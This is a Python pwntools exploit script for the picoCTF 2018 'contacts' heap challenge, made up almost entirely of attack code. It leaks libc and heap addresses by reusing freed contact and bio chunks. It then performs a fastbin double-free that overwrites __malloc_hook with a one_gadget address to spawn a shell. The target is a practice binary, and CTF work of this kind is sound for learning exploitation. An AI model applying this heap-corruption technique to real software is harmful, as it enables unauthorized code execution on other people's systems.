from pwn import *

context.terminal = ['xfce4-terminal', '-e']

one_gadget_off = 0x45216
contact_size = 0x10
leak_func = 'fgets'

e = ELF('contacts')

local = True
if local:
    r = process('./contacts')
    libc = ELF('/usr/lib/libc.so.6')
else:
    r = remote('2018shell1.picoctf.com', 40352)
    libc = ELF('libc.so.6.old')

amnt_above_hook = 0x13
above_malloc_hook_off = libc.symbols['__malloc_hook'] - amnt_above_hook

# Create a bio as a ghost contact
r.sendlineafter('> ', 'create biocreate')
r.sendlineafter('> ', 'bio biocreate')
r.sendlineafter("How long will the bio be?\n", str(contact_size - 1))
payload = ''
payload += 'A' * 8
payload += p64(e.got[leak_func])
r.sendlineafter("Enter your new bio:\n", payload)

# Create another bio of a different length to place the old bio on the fastbin freelist
r.sendlineafter('> ', 'bio biocreate')
r.sendlineafter("How long will the bio be?\n", '255')
r.sendlineafter("Enter your new bio:\n", 'long bio')

# Now create a new contact from the bio on the fastbin freelist
r.sendlineafter('> ', 'create aslrleak')

# Use the contact to leak ASLR
r.sendlineafter('> ', 'display')
r.recvuntil('aslrleak - ')
leak = r.recvuntil('\n')
leak = leak[:-1]
leak = leak.ljust(8, '\x00')
leak = u64(leak)
print leak_func + ' address: ' + hex(leak)
libc_base = leak - libc.symbols[leak_func]
print 'libc base: ' + hex(libc_base)

# Leak a heap address
# SHL = Setup Heap Leak
r.sendlineafter('> ', 'create shl')
r.sendlineafter('> ', 'bio shl')
r.sendlineafter("How long will the bio be?\n", str(contact_size - 1))
payload = ''
payload += 'C' * 8
payload += '\x00' * 8
r.sendlineafter("Enter your new bio:\n", payload)
r.sendlineafter('> ', 'delete shl')
r.sendlineafter('> ', 'create heapleak_______________________________________')
r.sendlineafter('> ', 'display')
r.recvuntil('heapleak_______________________________________ - ')
leak = r.recvuntil('\n')
leak = leak[:-1]
leak = leak.ljust(8, '\x00')
leak = u64(leak)
heap_addr = leak
print 'Leaked heap address: ' + hex(heap_addr)
atka_bio_addr = heap_addr + 0x1f0
print 'Leaked atka_bio_addr: ' + hex(atka_bio_addr)

# Fastbin attack
r.sendlineafter('> ', 'create atka')
r.sendlineafter('> ', 'create atkb')

r.sendlineafter('> ', 'bio atka')
r.sendlineafter("How long will the bio be?\n", str(0x78))
r.sendlineafter("Enter your new bio:\n", 'LOOK')

r.sendlineafter('> ', 'bio atkb')
r.sendlineafter("How long will the bio be?\n", str(0x78))
r.sendlineafter("Enter your new bio:\n", '')

r.sendlineafter('> ', 'bio atka')
r.sendlineafter("How long will the bio be?\n", '255')
r.sendlineafter("Enter your new bio:\n", '')

r.sendlineafter('> ', 'bio atkb')
r.sendlineafter("How long will the bio be?\n", '255')
r.sendlineafter("Enter your new bio:\n", '')

# sa = set up free a
r.sendlineafter('> ', 'create sa')
r.sendlineafter('> ', 'bio sa')
r.sendlineafter("How long will the bio be?\n", str(contact_size - 1))
payload = ''
payload += 'E' * 8
payload += p64(atka_bio_addr)
r.sendlineafter("Enter your new bio:\n", payload)

r.sendlineafter('> ', 'bio sa')
r.sendlineafter("How long will the bio be?\n", '255')
r.sendlineafter("Enter your new bio:\n", '')

# fa = free a
r.sendlineafter('> ', 'create fa')
gdb.attach(r)
r.sendlineafter('> ', 'bio fa')
r.sendlineafter("How long will the bio be?\n", '255')
r.sendlineafter("Enter your new bio:\n", '')

# a -> b -> a

print 'Allocate A and fake next chunk'
r.sendlineafter('> ', 'bio atka')
r.sendlineafter("How long will the bio be?\n", str(0x78))
payload = p64(libc_base + above_malloc_hook_off)
r.sendlineafter("Enter your new bio:\n", payload)

print 'Allocate B'
r.sendlineafter('> ', 'bio atkb')
r.sendlineafter("How long will the bio be?\n", str(0x78))
r.sendlineafter("Enter your new bio:\n", '')

print 'Allocate A as C'
r.sendlineafter('> ', 'bio sa')
r.sendlineafter("How long will the bio be?\n", str(0x78))
payload = p64(libc_base + above_malloc_hook_off)
r.sendlineafter("Enter your new bio:\n", payload)

print 'malloc hook overwrite'
r.sendlineafter('> ', 'bio heapleak_______________________________________')
r.sendlineafter("How long will the bio be?\n", str(0x78))
r.sendlineafter("Enter your new bio:\n", '')
r.sendlineafter('> ', 'bio fa')
r.sendlineafter("How long will the bio be?\n", str(0x78))
r.sendlineafter("Enter your new bio:\n", p64(libc_base + one_gadget_off))

print 'Call one gadget'
r.sendlineafter('> ', 'create gimmeeshell')
r.interactive()
